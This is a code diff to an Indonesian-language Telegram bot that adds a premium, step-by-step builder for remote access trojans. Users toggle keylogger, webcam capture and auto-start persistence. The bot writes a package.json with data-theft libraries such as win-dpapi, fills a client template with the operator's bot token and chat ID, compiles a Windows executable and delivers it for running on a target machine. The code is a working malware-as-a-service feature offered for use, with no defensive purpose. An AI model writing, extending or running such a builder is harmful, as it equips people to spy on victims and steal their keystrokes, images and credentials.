@@ -843,6 +843,67 @@ bot.on("callback_query", async (query) => {
             return bot.sendMessage(chatId, "Fitur ini hanya untuk pengguna premium.");
         }
 
+        userStates[chatId] = { action: 'awaiting_rat_platform', data: {} };
+
+        const platformMessage = "🤖 **Pembuatan RAT Interaktif**\n\nLangkah 1: Pilih platform target untuk RAT Anda.";
+        const platformButtons = [
+            { text: "🖥️ Windows", callback_data: "rat_platform_windows" },
+            { text: "📱 Android", callback_data: "rat_platform_android" },
+            { text: "⬅️ Batal", callback_data: "awan_premium_menu" }
+        ];
+
+        await bot.editMessageText(platformMessage, {
+            chat_id: chatId,
+            message_id: query.message.message_id,
+            reply_markup: createInlineKeyboard(platformButtons)
+        });
+    }
+    else if (data.startsWith('rat_platform_')) {
+        const platform = data.split('_')[2];
+        const state = userStates[chatId];
+        if (!state || state.action !== 'awaiting_rat_platform') {
+            return bot.answerCallbackQuery(query.id, { text: 'Sesi tidak valid atau telah kedaluwarsa.', show_alert: true });
+        }
+
+        if (platform === 'windows') {
+            state.action = 'awaiting_rat_features';
+            state.data.platform = 'windows';
+            // Initialize features as an object
+            state.data.features = {
+                keylogger: false,
+                webcam: false,
+                persistence: false
+            };
+
+            const featureMessage = "Langkah 2: Pilih fitur untuk RAT Windows Anda. Klik untuk mengaktifkan/menonaktifkan.";
+
+            // Function to generate feature buttons based on current state
+            const getFeatureButtons = () => [
+                { text: `Keylogger ${state.data.features.keylogger ? '✅' : '❌'}`, callback_data: "rat_feature_keylogger" },
+                { text: `Webcam Snapshot ${state.data.features.webcam ? '✅' : '❌'}`, callback_data: "rat_feature_webcam" },
+                { text: `Persistence (Auto-start) ${state.data.features.persistence ? '✅' : '❌'}`, callback_data: "rat_feature_persistence" },
+                { text: "➡️ Buat RAT Sekarang", callback_data: "rat_generate_now" },
+                { text: "⬅️ Kembali", callback_data: "awan_generate_desktop_rat" }
+            ];
+
+            await bot.editMessageText(featureMessage, {
+                chat_id: chatId,
+                message_id: query.message.message_id,
+                reply_markup: createInlineKeyboard(getFeatureButtons())
+            });
+
+        } else if (platform === 'android') {
+            await bot.answerCallbackQuery(query.id, { text: 'Pembuatan RAT untuk Android saat ini belum didukung melalui alur ini.', show_alert: true });
+        }
+        bot.answerCallbackQuery(query.id);
+    }
+    else if (data === 'rat_generate_now') {
+        const state = userStates[chatId];
+        if (!state || state.action !== 'awaiting_rat_features') {
+            return bot.answerCallbackQuery(query.id, { text: 'Sesi tidak valid atau telah kedaluwarsa.', show_alert: true });
+        }
+
+        bot.answerCallbackQuery(query.id);
         const generatingMessage = await bot.sendMessage(chatId, "⏳ Memulai proses pembuatan executable... Ini mungkin memakan waktu beberapa menit.");
 
         const tempDir = path.join(__dirname, 'temp', `rat_${chatId}_${Date.now()}`);
@@ -853,21 +914,41 @@ bot.on("callback_query", async (query) => {
         try {
             fs.mkdirSync(tempDir, { recursive: true });
 
+            // 1. Dynamically build package.json
+            const baseDependencies = {
+                "node-telegram-bot-api": "^0.61.0",
+                "axios": "^1.10.0",
+                "screenshot-desktop": "^1.15.0",
+                "sqlite3": "^5.1.7",
+                "win-dpapi": "^1.1.2"
+            };
+            if (state.data.features.keylogger) {
+                baseDependencies['node-keylogger'] = '^0.1.0';
+            }
+            if (state.data.features.webcam) {
+                baseDependencies['node-webcam'] = '^0.8.2';
+            }
             const ratPackageJson = {
                 name: 'rat-client',
                 version: '1.0.0',
                 main: 'rat_client.js',
-                dependencies: {
-                    "node-telegram-bot-api": "^0.61.0",
-                    "axios": "^1.10.0",
-                    "screenshot-desktop": "^1.15.0",
-                    "sqlite3": "^5.1.7",
-                    "win-dpapi": "^1.1.2"
-                }
+                dependencies: baseDependencies
             };
             fs.writeFileSync(tempPackageJsonPath, JSON.stringify(ratPackageJson, null, 2));
 
-            const template = fs.readFileSync(path.join(__dirname, 'rat_client_template.js'), 'utf8');
+            // 2. Dynamically build the script
+            let template = fs.readFileSync(path.join(__dirname, 'rat_client_template.js'), 'utf8');
+
+            if (!state.data.features.keylogger) {
+                template = template.replace(/\/\/ -- START_FEATURE_KEYLOGGER --[\s\S]*?\/\/ -- END_FEATURE_KEYLOGGER --/g, '');
+            }
+            if (!state.data.features.webcam) {
+                template = template.replace(/\/\/ -- START_FEATURE_WEBCAM --[\s\S]*?\/\/ -- END_FEATURE_WEBCAM --/g, '');
+            }
+            if (!state.data.features.persistence) {
+                template = template.replace(/\/\/ -- START_FEATURE_PERSISTENCE --[\s\S]*?\/\/ -- END_FEATURE_PERSISTENCE --/g, '');
+            }
+
             const finalScript = template
                 .replace('%%BOT_TOKEN%%', config.botToken)
                 .replace('%%CHAT_ID%%', config.adminId);
@@ -877,11 +958,7 @@ bot.on("callback_query", async (query) => {
 
             await new Promise((resolve, reject) => {
                  exec(`npm install`, { cwd: tempDir }, (error, stdout, stderr) => {
-                    if (error) {
-                        console.error(`NPM Install Error: ${stderr}`);
-                        reject(new Error('Gagal menginstal dependensi untuk RAT.'));
-                        return;
-                    }
+                    if (error) { reject(new Error('Gagal menginstal dependensi.')); return; }
                     resolve(stdout);
                 });
             });
@@ -891,28 +968,51 @@ bot.on("callback_query", async (query) => {
             const pkgPath = path.join(__dirname, 'node_modules', '.bin', 'pkg');
             await new Promise((resolve, reject) => {
                 exec(`${pkgPath} . --targets node16-win-x64 --output ${outputExePath}`, { cwd: tempDir }, (error, stdout, stderr) => {
-                    if (error) {
-                        console.error(`PKG Error: ${stderr}`);
-                        reject(new Error('Gagal mengkompilasi executable.'));
-                        return;
-                    }
+                    if (error) { reject(new Error('Gagal mengkompilasi executable.')); return; }
                     resolve(stdout);
                 });
             });
 
             await bot.editMessageText("... (3/4) Mengirim file...", { chat_id: chatId, message_id: generatingMessage.message_id });
 
-            await bot.sendDocument(chatId, outputExePath, {}, { caption: "✅ Berhasil! Berikut adalah RAT client Anda. Jalankan di mesin Windows target." });
+            await bot.sendDocument(chatId, outputExePath, {}, { caption: "✅ Berhasil! Berikut adalah RAT client Anda." });
             await bot.deleteMessage(chatId, generatingMessage.message_id);
 
         } catch (e) {
-            console.error("Gagal membuat RAT executable:", e);
             await bot.editMessageText(`❌ Terjadi kesalahan: ${e.message}`, { chat_id: chatId, message_id: generatingMessage.message_id });
         } finally {
             if (fs.existsSync(tempDir)) {
                 fs.rmSync(tempDir, { recursive: true, force: true });
             }
+            delete userStates[chatId];
         }
+    }
+    else if (data.startsWith('rat_feature_')) {
+        const feature = data.split('_')[2];
+        const state = userStates[chatId];
+        if (!state || state.action !== 'awaiting_rat_features') {
+            return bot.answerCallbackQuery(query.id, { text: 'Sesi tidak valid atau telah kedaluwarsa.', show_alert: true });
+        }
+
+        // Toggle the feature
+        if (state.data.features.hasOwnProperty(feature)) {
+            state.data.features[feature] = !state.data.features[feature];
+        }
+
+        const getFeatureButtons = () => [
+            { text: `Keylogger ${state.data.features.keylogger ? '✅' : '❌'}`, callback_data: "rat_feature_keylogger" },
+            { text: `Webcam Snapshot ${state.data.features.webcam ? '✅' : '❌'}`, callback_data: "rat_feature_webcam" },
+            { text: `Persistence (Auto-start) ${state.data.features.persistence ? '✅' : '❌'}`, callback_data: "rat_feature_persistence" },
+            { text: "➡️ Buat RAT Sekarang", callback_data: "rat_generate_now" },
+            { text: "⬅️ Kembali", callback_data: "awan_generate_desktop_rat" }
+        ];
+
+        // Update the message with new buttons
+        await bot.editMessageReplyMarkup(createInlineKeyboard(getFeatureButtons()), {
+            chat_id: chatId,
+            message_id: query.message.message_id
+        });
+        bot.answerCallbackQuery(query.id);
     }
     else if (data.startsWith("awan_") || data === 'awan_premium_menu') {
         awanPremiumHandler.execute(bot, query);
